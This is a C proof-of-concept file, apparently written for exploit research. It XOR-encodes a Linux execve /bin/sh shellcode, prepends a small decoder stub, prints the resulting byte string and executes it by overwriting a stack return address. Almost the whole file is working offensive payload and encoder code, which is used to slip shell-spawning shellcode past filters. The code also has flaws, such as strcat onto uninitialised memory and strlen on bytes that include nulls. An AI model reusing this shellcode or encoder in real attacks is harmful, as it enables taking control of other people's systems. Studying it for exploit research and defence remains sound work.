/*
 * Proof-of-concept to test the decoder
 *
 * Rodrigo Rubira Branco <rodrigo@kernelhacking.com>
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
 * XOR Shellcode Encoder
 */

void execute(char *  data);

int main() {

char decoder[] =

	// decoder.s
   "\xeb\x0c" //                   jmp    e <label3>
   "\x5e" //                     popl   %esi
   "\x6a\x00" //                    pushl  $0x0
   "\x59" //                      popl   %ecx
   "\x80\x36\x00" //               xorb   $0x0,(%esi)
   "\x46" //                      incl   %esi
   "\xe2\xfa" //                   loopl  6 <label2>
   "\xeb\x05" //                   jmp    13 <label4>
   "\xe8\xef\xff\xff\xff"; //          calll  2 <label1>



/* Linux execve /bin/sh shellcode */
char shellcode[] =
        "\xeb\x11\x31\xc9\x5e\xb1\x23\x80\x6c\x0e\xff\x17\x80\xe9\x01"
	"\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x48\xd7\x67\x7f\x46\x46"
	"\x8a\x7f\x7f\x46\x79\x80\x85\xa0\xfa\xa0\x7b\x3b\x23\xa0\x5b"
	"\x3b\x27\xa4\x63\x3b\x23\xa2\x6b\x3b\x1f\xc7\x22\xe4\x97";

char tmp;
char *end;
int size  = 11;
int i; 
int l = 15;

for(i=0;i<strlen(shellcode);i++) {

   shellcode[i] ^= size;

}
        decoder[4]  += strlen(shellcode);
        decoder[8] += size;

end = (char *) malloc(strlen(shellcode) + strlen(decoder));

strcat(end,decoder);
strcat(end,shellcode);

        //printf("\n\nchar shellcode[] =\n");
	printf("\"");
        for(i = 0; i < strlen(end); ++i) {
          if(l >= 15) {
           // if(i) printf("\"\n");
           // printf( "\t\"");
            l = 0;
          }
          ++l;
          printf("\\x%02x", ((unsigned char *)end)[i]);
        }
	printf("\"\n");

execute(end);
free(end);
}


void execute(char *data) {

int *ret;
ret = (int *)&ret + 2;
(*ret) = (int)data;

}



